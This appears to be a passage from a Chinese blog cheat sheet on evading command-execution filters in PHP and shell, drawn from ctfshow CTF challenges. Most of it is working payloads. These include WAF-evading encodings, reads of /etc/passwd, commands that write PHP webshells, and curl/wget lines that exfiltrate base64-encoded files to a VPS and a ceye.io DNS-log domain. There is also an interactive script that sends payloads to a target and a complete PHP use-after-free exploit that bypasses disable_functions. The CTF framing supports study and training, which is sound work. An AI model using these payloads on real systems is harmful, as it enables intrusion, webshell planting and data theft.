4，变量绕过

```bash
a=c;b=a;c=t;
$a$b$c 1.txt
12
```

5，编码进制绕过

```dsa
[root~]#  echo 'cat' | base64

Y2F0wqAK

[root~]#  `echo 'Y2F0wqAK' | base64 -d` 1.txt

hello world
1234567
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819223319938.png#pic_center)

16进制
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020081922334328.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819223413305.png#pic_center)

8进制
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819223432773.png#pic_center)

6，过滤文件名绕过（例如过滤/etc/passwd文件）

```sda
1) 利用正则匹配绕过

[root~]# cat /???/pass*

2) 例如过滤/etc/passwd中的etc，利用未初始化变量，使用$u绕过

[root~]# cat /etc$u/passwd

备注：此方法能绕CloudFlare WAF（出自：https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/）
123456789
```

7，命令执行函数system()绕过

- “\x73\x79\x73\x74\x65\x6d”(“cat%20/flag”);
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819222918776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
- (sy.(st).em)(whoami);
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819222828687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
- 使用内敛执行代替system

```bash
echo `ls`;
echo $(ls);
?><?=`ls`;
?><?=$(ls);
1234
```

8，使用`$*`和`$@`，`$x`,`${x}`

注：因为在没有传参的情况下，上面的特殊变量都是为空的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819223134872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)

9，读取文件骚姿势

```bash
curl file:///flag
strings /flag
uniq -c/etc/passwd
bash -v /etc/passwd
rev /etc/passwd
12345
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201015151913692.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819214732922.png#pic_center)

dir与ls的升级版

```bash
find -- 列出当前目录下的文件以及子目录所有文件
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819215054517.png#pic_center)



------

##### 0x02 过滤空格

- %09（url传递）(`cat%09flag.php`)
- ${IFS}
- $IFS$9
- <>（`cat<>/flag`）
- <（`cat</flag`）
- {cat,flag}

例;
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200729224339947.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200729224406557.png)





------

##### 0x03 过滤目录[分隔符](https://so.csdn.net/so/search?q=分隔符&spm=1001.2101.3001.7020) /

例：

```php
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/\//", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
123456789101112131415
```

采用多个管道命令即可

```bash
;cd flag_is_here;cat *
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200729225813622.png)





------

##### 0x04 过滤分隔符 | & ;

1，可以使用`%0a`代替，%0a其实在某种程度上是最标准的命令链接符号

| 功能     | 符号     | payload       |
| -------- | -------- | ------------- |
| 换行符   | %0a      | ?cmd=123%0als |
| 回车符   | %0d      | ?cmd=123%0dls |
| 连续指令 | ;        | ?1=123;pwd    |
| 后台进程 | &        | ?1=123&pwd    |
| 管道     | \|       | ?1=123\|pwd   |
| 逻辑运算 | \|\|或&& | ?1=123&&pwd   |

```bash
;	//分号
|	//只执行后面那条命令
||	//只执行前面那条命令
&	//两条命令都会执行
&&	//两条命令都会执行
12345
```

2，`?>`代替`;`

在php中可以用`?>`来代替最后一个`;`因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。
例题：ctfshow-web入门36

```bash
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
}else{
    highlight_file(__FILE__);
}
12345678910
```

这道题过滤了分号，直接用?>来代替分号

```bash
include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018133007829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)





##### 0x05 字符串长度受限

https://www.anquanke.com/post/id/87203

```java
root@kali:~/桌面# echo "flag{hahaha}" > flag.txt
root@kali:~/桌面# touch "ag"
root@kali:~/桌面# touch "fl\\"
root@kali:~/桌面# touch "t \\"
root@kali:~/桌面# touch "ca\\"
root@kali:~/桌面# ls -t
'ca\'  't \'  'fl\'   ag   flag
root@kali:~/桌面# ls -t >a     #将 ls -t 内容写入到a文件中
root@kali:~/桌面# sh a
a: 1: a: not found
flag{hahaha}
a: 6: flag.txt: not found
123456789101112
```

`\`是指换行
`ls -t`将文件按时间排序输出
`sh`命令可以从一个文件中读取命令来执行





##### 0x06 无回显

一，shell_exec等无回显函数。

判断：
`ls;sleep(3)`

利用：

1，复制，压缩，写shell等方法

```bash
copy flag.php 1.txt
mv flag.php flag.txt
cat flag.php > flag.txt
tar cvf flag.tar flag.php
tar zcvf flag.tar.gz flag.php
echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps > webshell.php
echo "<?php @eval(\$_POST[123]); ?>" > webshell.php
1234567
```

然后访问1.txt等对应生成的文件，例：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018142221818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018142209630.png#pic_center)

2、在vps上建立记录脚本

在自己的公网服务器站点根目录写入php文件，内容如下：
record.php

```bash
<?php
$data =$_GET['data'];
$f = fopen("flag.txt", "w");
fwrite($f,$data);
fclose($f);
?>
123456
```

在目标服务器的测试点可以发送下面其中任意一条请求进行测试

```bash
curl http://*.*.*.**/record.php?data=`cat flag.php|base64`
wget http://*.*.*.*/record.php?data=`cat flag.php|base64`
12
```

3，通过http请求/dns请求等方式带出数据

利用：

```bash
curl `命令`.域名
1
```

例：

```bash
#用<替换读取文件中的空格，且对输出结果base64编码
curl `cat<flag.php|base64`

#拼接域名(最终构造结果)
curl `cat<flag.php|base64`.v4utm7.ceye.io
#另一种方法(不过有的环境下不可以)`cat flag.php|sed s/[[:space:]]//g`.v4utm7.ceye.io
123456
```

更多方法参考：https://blog.csdn.net/qq_43625917/article/details/107873787

4，linux tee命令

Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。

```bash
用法:
tee file1 file2 //复制文件
ls /|tee 1.txt //命令输出
123
```

二，>/dev/null 2>&1类无回显

例题：ctfshow-web入门42

```bash
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
} 
1234567
```

`>/dev/null 2>&1主要意思是不进行回显的意思`
进行命令分隔即可

```bash
;	//分号
|	//只执行后面那条命令
||	//只执行前面那条命令
&	//两条命令都会执行
&&	//两条命令都会执行
12345
```

payload:

```bash
 cat flag.php||
 cat flag.php;
12
```





##### 0x07 Perl中open命令执行（GET）

https://blog.csdn.net/qq_44657899/article/details/107720578

##### 0x08 无数字字母getshell

思路：取反 ~，异或 ^，或运算 |

羽大佬的总结：[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）](https://blog.csdn.net/miuzzx/article/details/109143413)

一、取反：~

```bash
$_=~(%A0%B8%BA%AB);${$_}[__](${$_}[___]);&__=system&___=cat flag.php
$_=~%A0%B8%BA%AB;${$_}[_](${$_}[__]);&_=system&__=dir
$_=~(%A0%B8%BA%AB);${$_}[__](${$_}[___]);&__=assert&___=eval($_POST['a']);//蚁剑连接
123
```

用php生成;

```php
<?php
$code = "_GET";
echo urlencode(~$code);
?>
1234
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201112171010369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
二、异或：

php（代码用空格隔开）：

```php
//Author: 颖奇L'Amore
<?php
$flag = "s y s t e m";
$arr = explode(' ', $flag);

foreach ($arr as $key => $value) {
	echo "%".dechex(ord($value)^0xff);
}
echo "^";
foreach ($arr as $key => $value) {
	echo "%ff";
}
?>
12345678910111213
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201112171202810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
不可见字符异或（php）

```php
<?php
$l = "";
$r = "";
$argv = str_split("_GET");
for($i=0;$i<count($argv);$i++)
{   
    for($j=0;$j<255;$j++)
    {
        $k = chr($j)^chr(255);      \\dechex(255) = ff
        if($k == $argv[$i]){
        	if($j<16){
        		$l .= "%ff";
                $r .= "%0" . dechex($j);
        		continue;
        	}
            $l .= "%ff";
            $r .= "%" . dechex($j);
            continue;
        }
    }
}
echo "\{$l`$r\}";
?>
1234567891011121314151617181920212223
```

${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&ff=phpinfo

用python

```python
#Author: piCEBDC7
str_= 'system'
str_=list(str_)
final=''
for x in str_:
    print(hex(~ord(x)&0xff))
    final+=hex(~ord(x)&0xff)
print(str_)
final = final.replace('0x','%')
final+='^'
for x in range(len(str_)):
    final+=r'%ff'
print(final)
12345678910111213
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201112171319614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
不可见字符异或（python3）

```python
payload="phpinfo"
allowed="ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~!#%*+-/:;<=>?@"# no ()
reth=""
rett=""
for c in payload:
    flag=False
    for i in allowed:
        if flag == False:
            for j in allowed:
                if ord(i)^ord(j)==ord(c):
                    #print("i=%s j=%s c=%s"%(i,j,c))
                    reth=reth+"%"+str(hex(ord(i)))[2:]
                    rett=rett+"%"+str(hex(ord(j)))[2:]
                    flag=True
                    break
ret=reth+"^"+rett

print(ret)
123456789101112131415161718
```

三、或运算：

示例：ctfshow-web41

```bash
 <?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?> 
12345678910
```

这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。

题解：https://wp.ctf.show/d/137-ctfshow-web-web41

脚本：

```bash
import re
import requests
import urllib
from sys import *
import os
content = ''
preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/'
for i in range(256):
    for j in range(256):
        if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)):
            k = i | j
            if k>=32 and k<=126:
                a = '%' + hex(i)[2:].zfill(2)
                b = '%' + hex(j)[2:].zfill(2)
                content += (chr(k) + ' '+ a + ' ' + b + '\n')
f = open('rce_or.txt', 'w')
f.write(content)
if (len(argv) != 2):
    print("=" * 50)
    print('USER：python exp.py <url>')
    print("eg：  python exp.py http://ctf.show/")
    print("=" * 50)
    exit(0)
url = argv[1]


def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("rce_or.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"
    return (output)


while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command："))
    data = {
        'c': urllib.parse.unquote(param)
    }
    r = requests.post(url, data=data)
    print("\n[*] result:\n" + r.text)
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152
```

使用方法：

```bash
python3 exp.py 题目地址
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201017230713313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)

##### 0x09 过滤括号

使用不需要括号的函数

- echo

```bash
echo `cat /flag` 
1
```

- require

```bash
require '/flag'
1
include%09$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201015154053813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)

2，不需要引号和空格

```bash
#<?=require~~flag.txt?>
<?=require~%d0%99%93%9e%98?> 
12
```

##### 0x10 无参数RCE

更多无参数rce方法：https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200926143357160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
读取目录:

```bash
print_r(scandir(current(localeconv())));
print_r(scandir(pos(localeconv())));
12
```

注：pos(localeconv())等于.
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200926144038213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
读取flag文件：

```bash
print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));
highlight_file(next(array_reverse(scandir(pos(localeconv())))));
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020092614430018.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)

##### 0x11 内敛执行（常用）

常用payload：

```bash
echo `ls`;
echo $(ls);
?><?=`ls`;
?><?=$(ls);
1234
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201015152026146.png#pic_center)

将``或$()内命令的输出作为输入执行





##### 0x12 open_basedir绕过

单独写了一篇文章：[Bypass open_basedir](https://blog.csdn.net/qq_44657899/article/details/109171655)

##### 0x13 disable_function绕过

单独写了一篇文章：[Bypass disable_function](https://blog.csdn.net/qq_44657899/article/details/109171760)

##### 0x14 通配符+绝对路径调用命令

通配符是一种特殊语句，主要有星号(*)和问号(?)，用来模糊搜索文件。当查找文件夹时，可以使用它来代替一个或多个真正字符；当不知道真正字符或者懒得输入完整名字时，常常使用通配符代替一个或多个真正的字符。  实际上用“*Not?pad”可以对应Notepad\MyNotepad【*可以代表任何字符串；?仅代表单个字符串，但此单字必须存在】;Notep[ao]d可以对应Notepad\Notepod【ao代表a与o里二选一】，其余以此类推。

原理：
因为默认配置了环境变量使用才可以直接使用cat 等命令，但是可以使用路径调用命令如 /bin/cat，再加上通配符就能绕过很多限制。如图：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018214540151.png#pic_center)

一些常用工具所在目录：

```
/bin/cat
```

`/bin/base64 flag.php`:base64编码flag.php的内容。

`/usr/bin/bzip2 flag.php`:将flag.php文件进行压缩，然后再将其下载。

… … 等等

例题：ctfshow-web入门55

```bash
<?php

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
1234567891011
```

主要过滤了字母，分号，<>，使用通配符代替字母，目录调用命令即可。

payload1：

```bash
/???/????64 ????.???  #/bin/base64 flag.php
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018211918415.png#pic_center)

payload2:

```bash
/???/???/????2 ????.??? #/usr/bin/bzip2 flag.php
1
```

然后下载flag.php.bz2

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018212145207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)





##### 0x15 grep绕过关键词过滤

用法：

```bash
grep { flag.php
grep { f???????
12
```

打印`flag.php`中含有`{`的行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018205237993.png#pic_center)

例题：ctfshow-web入门54

```bash
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
123456789
```

过滤了很多关键词，正好grep没有过滤，再用${IFS}代替空格，fla?.php代替flag.php即可绕过。

payload:

```bash
grep${IFS}f${IFS}fla?.php
1
```

打印`flag.php`中有`f`的行![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018205636261.png#pic_center)





##### 0x16 使用~$()构造数字

例题：ctfshow-web入门57

```bash
<?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
} 
1234567891011
```

需要传数字36进去，但是过滤了数字。

```bash
$(())=0
$((~$(())))=-1
12
```

构造过程：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201019125212583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
于是payload：

```bash
$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
1
```





##### 0x17 uaf脚本绕过disable_function

例题：ctfshow-web入门72

题目进去就是这样的：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201020133106630.png#pic_center)好家伙，题目源码里的函数都禁用了，代码都显示不出来

给了源码文件如下：

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>
你要上天吗？
12345678910111213141516
```

这道题有严格的disable_function限制和open_basedir限制。

先利用glob://伪协议绕过open_basedir，发现根目录下有flag0.txt

payload：

```php
c=?><?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
}
exit(0);
?>
1234567
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201020134619109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)

然后用uaf脚本读取flag。

disable_function()限制了很多函数,可以直接用uaf脚本进行命令执行，原理是啥我也很懵。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201020134731119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
脚本如下：

最后输入要执行的命令即可。

```php
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
#需要通过url编码哦
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202
```





##### 0x18 disable_funcitons全通payload

该方法使用php类来绕过，可以配置disable_classes来禁用类。

读目录

```php
$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');};
1
```

读文件

```php
try {
  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
  foreach($dbh->query('select load_file("/var/www/html/index.php")') as $row) {
      echo($row[0])."|";
  }
  $dbh = null;
} catch (PDOException $e) {
  echo $e->getMessage();
  die();
}
12345678910
```

注：必须要有PDO拓展，里面的连接数据根据情况进行更改。

该方法来自：https://wp.ctf.show/d/142-ctfshow-web-web90-97





##### 0x19 利用php内置类rce

一， 利用 FilesystemIterator 获取指定目录下的所有文件
例题：ctfshow-web110

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }
    eval("echo new $v1($v2());");
}
?>
12345678910111213141516
```

payload：

```php
?v1=FilesystemIterator&v2=getcwd
1
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201108152244796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)
二，使用PHP的反射类ReflectionClass、ReflectionMethod和PHP异常处理 Exception来rce

例题：ctfshow-web109

```php
<?php
highlight_file(__FILE__);
error_reorting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

}
?> 
12345678910111213
```

payload：

```php
?v1=Exception&v2=system('cat *') 
?v1=Reflectionclass&v2=system('cat *')
12
```

